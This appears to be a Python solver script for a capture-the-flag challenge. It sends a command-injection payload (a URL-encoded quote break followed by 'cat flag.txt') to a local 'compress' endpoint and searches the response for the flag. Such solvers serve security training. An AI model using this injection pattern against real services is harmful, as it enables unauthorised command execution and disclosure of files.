import requests, re

flag_regex = re.compile(r'WACTF{.*?}')

URL = "http://localhost:1341/compress?query=%27;cat%20flag.txt)%23"

attempt = 0
while True:
    print("Searching for flag...")
    r = requests.get(URL)

    result = flag_regex.search(r.text)

    if result:
        print(result.group(0))
        exit(0)

    if attempt == 10:
        print("Could not find flag?")
        exit(1)
    
    attempt += 1
